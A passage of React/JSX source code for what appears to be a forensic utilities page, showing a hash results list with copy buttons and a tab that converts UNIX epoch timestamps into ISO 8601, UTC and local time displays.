                    <div className="min-w-0 flex-1">
                      <p className="text-slate-400 text-[11px]">{item.label}</p>
                      <p className={`font-bold truncate mt-0.5 ${item.color}`}>{item.value}</p>
                    </div>
                    <button
                      onClick={() => copyToClipboard(item.value, item.label)}
                      className="p-1.5 rounded text-slate-400 hover:text-white hover:bg-slate-800 transition-colors"
                      title="Copy Hash"
                    >
                      {copiedKey === item.label ? <Check className="w-4 h-4 text-emerald-400" /> : <Copy className="w-4 h-4" />}
                    </button>
                  </div>
                ))}
              </div>
            )}
          </div>
        )}

        {/* ─── TAB 6: TIMESTAMP CONVERTER ─── */}
        {activeTab === "timestamp" && (
          <div className="glass-panel rounded-xl p-6 space-y-6 animate-fade-in">
            <div className="space-y-1">
              <span className="text-sm font-semibold text-foreground flex items-center gap-2">
                <Clock className="w-4 h-4 text-cyan-400" />
                UNIX Epoch & Forensic Timestamp Converter
              </span>
              <p className="text-xs text-muted-foreground">
                Convert epoch timestamps found in web server logs, database audits, and PCAPs into human-readable ISO and UTC times.
              </p>
            </div>

            <div className="flex gap-3 items-center">
              <input
                type="text"
                value={epochInput}
                onChange={(e) => handleConvertTimestamp(e.target.value)}
                placeholder="e.g. 1787473600 (seconds) or 1787473600000 (ms)"
                className="flex-1 bg-slate-950/80 border border-slate-800 rounded-lg px-3 py-2 text-xs font-mono text-slate-200 focus:outline-none focus:border-primary/50"
              />
              <button
                onClick={() => handleConvertTimestamp(Math.floor(Date.now() / 1000).toString())}
                className="px-3 py-2 rounded-lg text-xs font-medium bg-slate-800 text-slate-300 hover:text-white border border-slate-700 transition-colors flex items-center gap-1"
              >
                <RotateCcw className="w-3 h-3" /> Current Epoch
              </button>
            </div>

            {isoOutput && (
              <div className="grid grid-cols-1 md:grid-cols-3 gap-4 text-xs font-mono">
                <div className="p-3.5 rounded-lg bg-black/40 border border-slate-800 space-y-1">
                  <p className="text-slate-400 text-[11px]">ISO 8601 UTC</p>
                  <p className="text-cyan-400 font-bold text-sm truncate">{isoOutput}</p>
                </div>
                <div className="p-3.5 rounded-lg bg-black/40 border border-slate-800 space-y-1">
                  <p className="text-slate-400 text-[11px]">UTC String</p>
                  <p className="text-purple-300 font-bold text-sm truncate">{utcOutput}</p>
                </div>
                <div className="p-3.5 rounded-lg bg-black/40 border border-slate-800 space-y-1">
                  <p className="text-slate-400 text-[11px]">Local System Time</p>
                  <p className="text-emerald-300 font-bold text-sm truncate">{localOutput}</p>
                </div>
              </div>
            )}
          </div>
        )}
      </div>
    </Layout>
  );
}
